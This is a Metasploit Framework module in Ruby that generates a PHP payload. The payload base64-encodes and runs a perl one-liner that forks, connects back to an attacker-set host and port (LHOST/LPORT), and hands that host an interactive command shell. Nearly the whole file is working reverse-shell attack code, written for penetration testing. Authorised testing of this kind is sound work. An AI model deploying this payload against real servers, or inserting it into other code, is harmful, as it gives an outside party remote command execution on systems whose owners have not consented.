##
# $Id: reverse_perl.rb 6479 2009-04-13 14:33:26Z kris $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/payload/php'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'


module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Php

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'PHP Command, Double reverse TCP connection (via perl)',
			'Version'       => '$Revision: 6479 $',
			'Description'   => 'Creates an interactive shell via perl',
			'Author'        => 'cazz',
			'License'       => BSD_LICENSE,
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		buf = "#{php_preamble}"
		buf += "$c = base64_decode('#{Rex::Text.encode_base64(command_string)}');"
		buf += "#{php_system_block({:cmd_varname=>"$c"})}"
		return super + buf
			
	end
	
	#
	# Returns the command string to use for execution
	#
	def command_string
		cmd = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"#{datastore['LHOST']}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
	end

end